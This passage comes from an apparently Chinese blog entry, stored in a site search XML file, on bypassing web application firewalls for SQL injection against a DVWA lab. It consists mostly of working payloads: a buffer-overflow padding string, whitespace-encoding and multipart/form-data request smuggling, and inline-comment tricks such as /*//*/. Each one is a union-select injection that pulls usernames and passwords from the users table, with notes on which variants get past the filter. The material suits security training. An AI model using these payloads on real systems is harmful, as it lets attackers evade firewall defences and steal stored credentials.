AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB&amp;id=1&#x27; union select null,concat_ws(char(32,58,32),user,password) from users%23</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/15/TGSn9jEO6YJwzKL.png" alt="image-20211015235313081"></p>
<h2 id="空白符替换绕过"><a href="#空白符替换绕过" class="headerlink" title="空白符替换绕过"></a>空白符替换绕过</h2><p><strong>绕过技巧</strong>：</p>
<ul>
<li>拒绝传统的%20，替换为%09%0a%0b%08……</li>
<li>GET型请求转POST型</li>
</ul>
<blockquote>
<p>注：</p>
<p>%09        水平制表符（\t）</p>
<p>%0a        换行（\n）</p>
<p>%0b        垂直制表符（\v）</p>
<p>%0c        换页（\f）</p>
<p>%0d        回车（\r）</p>
<p>%a0        不间断空格</p>
</blockquote>
<p><strong>数据包构造</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 83</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws(char%0a%0d(32,58,32),user,password) from users #</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/16/lhWsHSvDfrwjN2Q.png" alt="image-20211016103625239"></p>
<h2 id="协议未覆盖绕过"><a href="#协议未覆盖绕过" class="headerlink" title="协议未覆盖绕过"></a>协议未覆盖绕过</h2><p>在 http 头里的 Content-Type 提交表单支持四种协议：</p>
<ul>
<li>application/x-www-form-urlencoded  -编码模式</li>
<li>multipart/form-data  -文件上传模式</li>
<li>text/plain  -文本模式</li>
<li>application/json  -json模式</li>
</ul>
<p>文件头的属性是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 表示该数据被编码为一条消息,页上的每个控件对应消息中的一个部分。所以,当 waf 没有规则匹配该协议传输的数据时可被绕过。</p>
<p><strong>绕过技巧</strong>：</p>
<ul>
<li>使用表单请求中的multipart/form-data</li>
<li>关键词换行</li>
<li>GET型请求转POST型</li>
</ul>
<p><strong>数据包构造</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/sqli/?Submit=Submit HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Length: 218</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/dvwa/vulnerabilities/sqli/?Submit=Submit</span><br><span class="line">Cookie: security=low; ECS[visit_times]=1; PHPSESSID=90a4331de18bcd32ee2d780254f44589</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union select null,concat_ws</span><br><span class="line"></span><br><span class="line">(char(32,58,32),user,password) </span><br><span class="line"></span><br><span class="line">from users #</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/16/iybr6tfZzQsVJnO.png" alt="image-20211016111037975"></p>
<h2 id="注释符替换绕过"><a href="#注释符替换绕过" class="headerlink" title="注释符替换绕过"></a>注释符替换绕过</h2><p>因为注释符#、– 都是把后面的语句全部注释掉了，而内联注释/**/则是注释指定部分，需要一前一后闭合，所以在传参那里几乎不做注释语句用，而是用于过滤空格等bypass。</p>
<p><strong>绕过技巧</strong>：</p>
<ul>
<li>使用内联注释符/**/来构造payload进行绕过</li>
</ul>
<p>使用order by语句进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/16/tnBhzJPOFDXUjox.png" alt="image-20211016145100751"></p>
<p><code>/**/</code>替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/**/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>

<p><code>/*--*/</code>替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/*--*/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 被拦截</span><br></pre></td></tr></table></figure>

<p><code>/*//*/</code>替换空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+order/*//*/by 2+%23&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line"># 不拦截</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/16/ISpgjVWdTlus1xE.png" alt="image-20211016145143507"></p>
<p>再使用union select语句进行测试</p>
<p><img src="https://i.loli.net/2021/10/16/ldBFst71nVmaO4j.png" alt="image-20211016150036280"></p>
<p>得出可以使用<code>/*//*/</code>代替空格来进行绕过获取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:812/vulnerabilities/sqli/?id=1%27+union/*//*/select 1,concat_ws(char(32,58,32),user,password) from/*//*/users+%23&amp;Submit=Submit#</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/16/ZkhTPXifCQYWKIr.png" alt="image-20211016150953965"></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>WAF-Bypass</tag>
      </tags>
  </entry>
</search>
